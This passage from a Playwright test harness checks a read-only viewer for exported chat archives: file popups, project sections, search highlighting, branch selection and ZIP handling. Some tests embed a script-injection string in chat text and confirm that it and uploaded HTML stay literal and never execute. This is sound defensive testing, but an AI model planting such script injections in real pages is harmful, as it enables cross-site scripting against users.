    fs.writeFileSync(ufile, buildHtml([ups.conversation], '2026-11-05T12:00:00Z', () => ups.ctx));
    const pop = await open({}, 'file://' + ufile);
    const chip = (p, name) => p.page.locator(`.chip:has(b:text-is(${JSON.stringify(name)}))`);
    const dialog = p => p.page.locator('[role="dialog"]');
    const hashBefore = await atHash(pop);
    check('popup: five uploads and one attachment are chips', (await pop.page.locator('#chat .chips .chip').count()) === 6);
    check('popup: chips are buttons', (await pop.page.locator('#chat .chips button.chip').count()) === 6);
    check('popup: no dialog before a click', (await dialog(pop).count()) === 0);

    await chip(pop, 'photo.png').click();
    await dialog(pop).waitFor();
    check('popup: it is a modal dialog', (await dialog(pop).getAttribute('aria-modal')) === 'true');
    check('popup: the dialog is named by the file', (await dialog(pop).getAttribute('aria-label')) === 'photo.png');
    check('popup: the page behind is inert', await pop.page.$eval('#app', a => a.inert === true));
    check('popup: focus moved into the dialog', await pop.page.evaluate(() => !!document.activeElement.closest('[role="dialog"]')));
    await pop.page.waitForFunction(() => { const i = document.querySelector('[role="dialog"] img'); return i && i.complete; });
    check('popup: an image shows', await pop.page.$eval('[role="dialog"] img', i => i.naturalWidth > 0 && i.getAttribute('src') === 'uploads/p01_photo.png'));
    check('popup: an image offers Open file', (await dialog(pop).locator('a:text-is("Open file")').getAttribute('href')) === 'uploads/p01_photo.png');
    for (let i = 0; i < 6; i++) await pop.page.keyboard.press('Tab');
    check('popup: Tab stays in the dialog', await pop.page.evaluate(() => !!document.activeElement.closest('[role="dialog"]')));
    await pop.page.keyboard.press('Shift+Tab');
    await pop.page.keyboard.press('Shift+Tab');
    await pop.page.keyboard.press('Shift+Tab');
    check('popup: Shift+Tab stays in the dialog', await pop.page.evaluate(() => !!document.activeElement.closest('[role="dialog"]')));
    await pop.page.keyboard.press('Escape');
    check('popup: Escape closes it', (await dialog(pop).count()) === 0);
    check('popup: focus returns to the chip', await pop.page.evaluate(() => document.activeElement.querySelector('b') && document.activeElement.querySelector('b').textContent === 'photo.png'));
    check('popup: the page is live again', await pop.page.$eval('#app', a => a.inert === false));

    await chip(pop, 'page.html').click();
    await dialog(pop).waitFor();
    const source = await dialog(pop).locator('pre').textContent();
    check('popup: uploaded html shows as source', source === UPLOAD_HTML, source);
    await pop.page.waitForTimeout(200);
    check('popup: uploaded html never ran', !(await pop.page.evaluate(() => !!window.__hit)) && (await dialog(pop).locator('h1, script, iframe, img').count()) === 0);
    check('popup: text has no Open file', (await dialog(pop).locator('a').count()) === 0);
    await dialog(pop).locator('.close').click();
    check('popup: the close button closes it', (await dialog(pop).count()) === 0);

    await chip(pop, 'pasted.txt').click();
    await dialog(pop).waitFor();
    check('popup: an attachment shows its text literally', (await dialog(pop).locator('pre').textContent()) === 'line one\nline two <b>literal</b>' && (await dialog(pop).locator('pre b').count()) === 0);
    await pop.page.mouse.click(5, 5);
    check('popup: a click outside closes it', (await dialog(pop).count()) === 0);

    await chip(pop, 'paper.pdf').click();
    await dialog(pop).waitFor();
    check('popup: a pdf is a frame', await pop.page.$eval('[role="dialog"] iframe', f => f.getAttribute('src') === 'uploads/p01_paper.pdf' && !f.hasAttribute('srcdoc')));
    await pop.page.click('[role="dialog"]', { position: { x: 20, y: 20 } });
    check('popup: a click inside does not close it', (await dialog(pop).count()) === 1);
    await pop.page.keyboard.press('Escape');

    await chip(pop, 'minutes.odt').click();
    await dialog(pop).waitFor();
    check('popup: an odt shows details and a link', (await dialog(pop).locator('.file-details b').textContent()) === 'minutes.odt' && (await dialog(pop).locator('a.file-open').getAttribute('href')) === 'uploads/p01_minutes.odt');
    check('popup: the link opens a new tab safely', await dialog(pop).locator('a.file-open').evaluate(a => a.target === '_blank' && /noopener/.test(a.rel)));
    await pop.page.keyboard.press('Escape');

    await chip(pop, 'lost.csv').click();
    await dialog(pop).waitFor();
    check('popup: a missing upload says so', (await dialog(pop).textContent()).includes('This file is not in this export.') && (await dialog(pop).locator('a').count()) === 0);
    await pop.page.keyboard.press('Escape');
    check('popup: opening and closing leaves the hash alone', (await atHash(pop)) === hashBefore && await pop.page.$eval('#panel', n => n.hidden));

    const project = pop.page.locator('#project');
    check('project: the section is under the top bar', await project.evaluate(n => n.tagName === 'DETAILS' && !n.hidden && !n.open && n.getBoundingClientRect().top >= document.getElementById('top').getBoundingClientRect().bottom - 1));
    check('project: it names the project', (await project.locator('summary').textContent()).includes('Budget project'));
    await project.locator('summary').click();
    check('project: it lists files and documents', (await project.locator('button.chip').allTextContents()).join('|').includes('spec.pdf') && (await project.locator('button.chip').count()) === 3);
    await project.locator('button.chip:has(b:text-is("spec.pdf"))').click();
    await dialog(pop).waitFor();
    check('project: a file opens in the popup', await pop.page.$eval('[role="dialog"] iframe', f => f.getAttribute('src') === 'project/files/spec.pdf'));
    await pop.page.keyboard.press('Escape');
    await project.locator('button.chip:has(b:text-is("data.zip"))').click();
    await dialog(pop).waitFor();
    check('project: a zip shows a link', (await dialog(pop).locator('a.file-open').getAttribute('href')) === 'project/files/data.zip');
    await pop.page.keyboard.press('Escape');
    await project.locator('button.chip:has(b:text-is("Brief"))').click();
    await dialog(pop).waitFor();
    check('project: a document shows its text literally', (await dialog(pop).locator('pre').textContent()) === 'Be <i>kind</i>.\nSecond line.' && (await dialog(pop).locator('i').count()) === 0);
    await pop.page.keyboard.press('Escape');
    clean('popups', pop.seen);

    const noProject = await open({}, url);
    check('project: hidden for a chat without one', await noProject.page.$eval('#project', n => n.hidden));
    const phoneP = await open({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true }, 'file://' + ufile);
    await phoneP.page.locator('.chip:has(b:text-is("photo.png"))').tap();
    await dialog(phoneP).waitFor();
    check('phone: the popup fits the screen', await phoneP.page.$eval('[role="dialog"]', n => { const r = n.getBoundingClientRect(); return r.left >= 0 && r.right <= innerWidth && r.bottom <= innerHeight; }));
    check('phone: no sideways scroll with the popup', await phoneP.page.evaluate(() => document.documentElement.scrollWidth <= innerWidth));

    // Search and project grouping
    const branchy = plainChat('branchy', 'Branchy chat', 2, '2026-04-01T00:00:00Z');
    branchy.chat_messages[1].content[0].text = 'Old reply about the magenta unicorn.';
    branchy.chat_messages.push({ ...clone(branchy.chat_messages[1]), uuid: 'branchy-new', created_at: '2026-02-01T10:30:00Z', content: [{ type: 'text', text: 'New reply, nothing special.' }] });
    branchy.current_leaf_message_uuid = 'branchy-new';
    const farChat = plainChat('far', 'Far chat', 40, '2026-03-15T00:00:00Z');
    farChat.chat_messages[26].content[0].text = 'The quokka is <b>here</b> and `quokka` again.';
    const spans = turnsChat('spans', 'Spans chat', ['Read [the docs](https://a.test/x) now, <script>' + HIT + '</script> stays text.'], '2026-03-14T00:00:00Z');
    const manyHits = turnsChat('many', 'Many hits', Array.from({ length: 60 }, (_, i) => `needle number ${i}`), '2026-03-06T00:00:00Z');
    const searchSet = [branchy, farChat, spans, plainChat('pz', 'Zeta roadmap', 2, '2026-03-10T00:00:00Z'), plainChat('pa', 'Alpha notes', 2, '2026-03-09T00:00:00Z'), plainChat('pa2', 'Alpha two', 2, '2026-03-08T00:00:00Z'), plainChat('loose', 'Loose chat', 2, '2026-03-07T00:00:00Z'), manyHits];
    const sfile = path.join(dir, 'search.html');
    const projectOf = { pz: 'Zeta', pa: 'Alpha', pa2: 'Alpha' };
    fs.writeFileSync(sfile, buildHtml(searchSet, '2026-11-05T12:00:00Z', c => projectOf[c.uuid] ? { project: { name: projectOf[c.uuid], fileDir: 'project/files', fileNames: [], docs: [] } } : {}));
    const find = await open({}, 'file://' + sfile);
    const labels = await find.page.$$eval('#recents .lab', l => l.map(x => x.textContent));
    check('groups: Recents then projects by name', labels.join('|') === 'Recents|Alpha|Zeta', labels.join('|'));
    const under = async name => find.page.$$eval('#recents .lab', (labs, n) => { const lab = labs.find(l => l.textContent === n); return [...lab.nextElementSibling.querySelectorAll('.item')].map(i => i.textContent); }, name);
    check('groups: project chats sit under their project', (await under('Alpha')).join() === 'Alpha notes,Alpha two' && (await under('Zeta')).join() === 'Zeta roadmap');
    check('groups: project chats are not in Recents', !(await under('Recents')).some(t => /Alpha|Zeta/.test(t)) && (await under('Recents')).includes('Loose chat'));
    check('groups: footer still counts every chat', (await find.page.textContent('#archive')) === 'Archive · 8 chats · read-only');
    const box8 = find.page.locator('.find input');
    await box8.fill('magenta'); await find.page.waitForTimeout(250);
    await find.page.waitForSelector('#results .hit');
    check('search: results replace the list', await find.page.evaluate(() => document.getElementById('recents').hidden && !document.getElementById('results').hidden));
    const firstHit = await find.page.locator('#results .hit').first().textContent();
    check('search: a hit shows chat title and snippet', firstHit.includes('Branchy chat') && firstHit.includes('magenta unicorn'), firstHit);
    await find.page.locator('#results .hit').first().click();
    await find.page.waitForSelector('mark');
    const chatText = await find.page.textContent('#chat');
    check('search: a hit on an inactive branch opens that branch', (await find.page.textContent('#title')) === 'Branchy chat' && chatText.includes('Old reply about the magenta unicorn') && !chatText.includes('New reply'));
    check('search: the match is highlighted', (await find.page.$$eval('mark', m => m.map(x => x.textContent))).join() === 'magenta');
    check('search: the hash names that branch', (await find.page.evaluate(() => location.hash)).includes('leaf=branchy-1'), await find.page.evaluate(() => location.hash));
    await box8.fill('QUOKKA'); await find.page.waitForTimeout(250);
    await find.page.waitForSelector('#results .hit');
    await find.page.locator('#results .hit').first().click();
    await find.page.waitForSelector('mark');
    await find.page.waitForTimeout(200);
    check('search: a far message is scrolled into view and highlighted', await find.page.evaluate(() => { const m = document.querySelector('mark'), r = m.getBoundingClientRect(), s = document.getElementById('scroll').getBoundingClientRect(); return m.textContent === 'quokka' && document.querySelectorAll('mark').length === 1 && r.top >= s.top && r.bottom <= s.bottom; }));
    check('search: chat text stays literal', (await find.page.textContent('#chat')).includes('<b>here</b>') && (await find.page.$$('#chat .msg b')).length === 0);
    await box8.fill('docs](https'); await find.page.waitForTimeout(250);
    await find.page.waitForSelector('#results .hit');
    const errorsBefore = find.seen.errors.length;
    await find.page.locator('#results .hit').first().click();
    await find.page.waitForSelector('#title:has-text("Spans chat")');
    await find.page.waitForTimeout(200);
    check('search: a match spanning formatting opens without a highlight or error', (await find.page.$$('mark')).length === 0 && find.seen.errors.length === errorsBefore);
    check('search: hostile text does not run', !(await find.page.evaluate(() => window.__hit)));
    await box8.fill('zeta'); await find.page.waitForTimeout(250);
    await find.page.waitForSelector('#results .hit');
    await find.page.locator('#results .hit').first().click();
    await find.page.waitForSelector('#title:has-text("Zeta roadmap")');
    check('search: a title hit opens the chat and highlights nothing', (await find.page.$$('mark')).length === 0 && (await find.page.evaluate(() => location.hash)).includes('chat=pz'));
    await box8.fill('   '); await find.page.waitForTimeout(250);
    await find.page.waitForTimeout(250);
    check('search: blank query shows the list', await find.page.evaluate(() => !document.getElementById('recents').hidden && document.getElementById('results').hidden));
    await box8.fill('nothing-matches-this'); await find.page.waitForTimeout(250);
    await find.page.waitForSelector('#results .lab');
    check('search: no matches says so', (await find.page.textContent('#results')).includes('No matches'));
    await box8.fill('needle'); await find.page.waitForTimeout(250);
    await find.page.waitForSelector('#results .hit');
    check('search: 50 results at most, with a note', (await find.page.$$('#results .hit')).length === 50 && (await find.page.textContent('#results')).includes('Showing first 50 results'));
    await box8.press('Escape');
    check('search: Escape clears and restores the list', (await box8.inputValue()) === '' && await find.page.evaluate(() => !document.getElementById('recents').hidden && document.getElementById('results').hidden));
    clean('search', find.seen);
    const onePath = path.join(dir, 'one-search.html');
    fs.writeFileSync(onePath, buildHtml([turnsChat('solo', 'Solo chat', ['The solo answer.'], '2026-01-01T00:00:00Z')], '2026-11-05T12:00:00Z'));
    const one8 = await open({}, 'file://' + onePath);
    check('one chat: sidebar lists it under Recents', (await one8.page.$$eval('#recents .lab', l => l.map(x => x.textContent))).join() === 'Recents' && (await one8.page.$$('#recents .item')).length === 1);
    await one8.page.locator('.find input').fill('solo answer');
    await one8.page.waitForSelector('#results .hit');
    await one8.page.locator('#results .hit').first().click();
    await one8.page.waitForSelector('mark');
    check('one chat: search finds and highlights', (await one8.page.textContent('mark')) === 'solo answer');
    clean('one chat', one8.seen);

    // A real mega-ZIP, unzipped: the real export code, the real JSZip, and two chats sharing a project.
    const unzipped = path.join(dir, 'unzipped');
    await unzipMegaZip(unzipped);
    const viewerPath = path.join(unzipped, 'viewer.html');
    const mega = await open({}, 'file://' + viewerPath);
    check('mega-ZIP: one viewer holds every chat', (await mega.page.$$('.item')).length === 2);
    check('mega-ZIP: no unzip banner', (await mega.page.locator('#unzip').count()) === 0);
    await mega.page.locator('.item:has-text("Chat with a photo")').click();
    await mega.page.waitForSelector('#chat .chip');
    await chip(mega, 'photo.png').click();
    await dialog(mega).waitFor();
    await mega.page.waitForFunction(() => { const i = document.querySelector('[role="dialog"] img'); return i && i.complete; });
    const megaImage = await mega.page.$eval('[role="dialog"] img', i => ({ width: i.naturalWidth, src: i.getAttribute('src') }));
    check('mega-ZIP: an upload image loads from its link', megaImage.width > 0 && fs.existsSync(path.join(unzipped, decodeURIComponent(megaImage.src))), JSON.stringify(megaImage));
    await mega.page.keyboard.press('Escape');
    for (const title of ['Chat with a photo', 'Second project chat']) {
      await mega.page.locator(`.item:has-text("${title}")`).click();
      await mega.page.waitForFunction(t => document.getElementById('title').textContent === t, title);
      await mega.page.waitForFunction(() => !document.getElementById('project').hidden);
      await mega.page.$eval('#project', n => { n.open = true; });
      await mega.page.locator('#project button.chip:has(b:text-is("Paper.pdf"))').click();
      await dialog(mega).waitFor();
      const src = await mega.page.$eval('[role="dialog"] iframe', f => f.getAttribute('src'));
      check(`mega-ZIP: ${title} links the one shared PDF`, src === 'projects/Shared_Project/files/Paper.pdf', src);
      check(`mega-ZIP: that PDF is on disk, byte for byte (${title})`, fs.existsSync(path.join(unzipped, src)) && fs.readFileSync(path.join(unzipped, src), 'latin1') === MINIMAL_PDF);
      await mega.page.waitForTimeout(200);
      check(`mega-ZIP: the browser requested that PDF (${title})`, mega.seen.files.some(u => u.endsWith('/' + src)));
      await mega.page.keyboard.press('Escape');
    }
    clean('mega-ZIP', mega.seen);

    // Not unzipped: alone in a folder, with no viewer-check.gif beside it.
    const alone = path.join(dir, 'alone');
    fs.mkdirSync(alone);
    fs.copyFileSync(viewerPath, path.join(alone, 'viewer.html'));
    const lonely = await open({}, 'file://' + path.join(alone, 'viewer.html'));
    await lonely.page.waitForSelector('#unzip');
    check('unzip: a lone viewer.html says to unzip first', (await lonely.page.textContent('#unzip')) === "Unzip this archive first. Files can't open from inside a ZIP.");
    check('unzip: the chat text still shows', (await lonely.page.locator('#chat .msg').count()) > 0 && (await lonely.page.textContent('#chat')).includes('message 1'));
    check('unzip: the banner does not cover the title', await lonely.page.evaluate(() => document.getElementById('unzip').getBoundingClientRect().bottom <= document.getElementById('top').getBoundingClientRect().top));
    check('unzip: the banner does not cover the chat', await lonely.page.evaluate(() => document.getElementById('unzip').getBoundingClientRect().bottom <= document.getElementById('scroll').getBoundingClientRect().top));
    if (process.env.SHOT_DIR) await lonely.page.screenshot({ path: path.join(process.env.SHOT_DIR, 'unzip-banner.png') });
    const lonelyPhone = await open({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true }, 'file://' + path.join(alone, 'viewer.html'));
    await lonelyPhone.page.waitForSelector('#unzip');
    check('unzip: fits a phone', await lonelyPhone.page.evaluate(() => document.documentElement.scrollWidth <= innerWidth));

    if (process.env.SHOT_DIR) {
      const out = n => path.join(process.env.SHOT_DIR, n);
      for (const colorScheme of ['light', 'dark']) {
        const s = await open({ colorScheme });
        await s.page.screenshot({ path: out(`${colorScheme}-top.png`) });
        await s.page.$$eval('details.line', d => { d[0].open = true; d[1].open = true; });
        await s.page.evaluate(() => { document.getElementById('scroll').scrollTop = 0; });
        await s.page.screenshot({ path: out(`${colorScheme}-expanded.png`) });
        await s.page.$$eval('details.line', d => { d[0].open = false; d[1].open = false; });
        await s.page.evaluate(() => { document.getElementById('scroll').scrollTop = 620; });
        await s.page.waitForTimeout(150);
        await s.page.screenshot({ path: out(`${colorScheme}-table.png`) });
        await s.page.evaluate(() => { document.getElementById('scroll').scrollTop = 1250; });
        await s.page.waitForTimeout(150);
        await s.page.screenshot({ path: out(`${colorScheme}-code.png`) });
        const p = await open({ colorScheme, viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true, deviceScaleFactor: 2 });
        await p.page.screenshot({ path: out(`${colorScheme}-phone.png`) });
        await p.page.evaluate(() => { document.getElementById('scroll').scrollTop = 900; });
        await p.page.waitForTimeout(150);
        await p.page.screenshot({ path: out(`${colorScheme}-phone-table.png`) });
        await p.page.click('#menu');
        await p.page.waitForTimeout(300);
        await p.page.screenshot({ path: out(`${colorScheme}-phone-drawer.png`) });
        const ps = await open({ colorScheme }, purl);
        await openFile(ps, 'report.html', 2);
        await frameIn(ps);
        await ps.page.waitForTimeout(200);
        await ps.page.screenshot({ path: out(`${colorScheme}-panel-html.png`) });
        await ps.page.click('#panel .tab:has-text("Code")');
        await ps.page.screenshot({ path: out(`${colorScheme}-panel-code.png`) });
        await openFile(ps, 'notes.md');
        await ps.page.waitForTimeout(100);
        await ps.page.screenshot({ path: out(`${colorScheme}-panel-md.png`) });
        await openFile(ps, 'remote-lib.html');
        await ps.page.waitForTimeout(200);
        await ps.page.screenshot({ path: out(`${colorScheme}-panel-remote.png`) });
        await openFile(ps, 'bundle.zip');
        await ps.page.screenshot({ path: out(`${colorScheme}-panel-binary.png`) });
        await openFile(ps, 'gone.png');
        await ps.page.screenshot({ path: out(`${colorScheme}-panel-missing.png`) });
        const pp = await open({ colorScheme, viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true, deviceScaleFactor: 2 }, purl);
        await pp.page.waitForSelector(card('report.html'));
        await pp.page.locator(card('report.html')).first().tap();
        await pp.page.waitForSelector('#panel:not([hidden])');
        await pp.page.waitForTimeout(200);
        await pp.page.screenshot({ path: out(`${colorScheme}-phone-panel.png`) });
      }
    }
  } catch (e) {
    failed++;
    console.log('HARNESS ERROR', e.message);
  } finally {
    await browser.close();
    fs.rmSync(dir, { recursive: true, force: true });
  }
  console.log(failed ? `\n${failed} failed` : '\nall passed');
  process.exit(failed ? 1 : 0);
})();
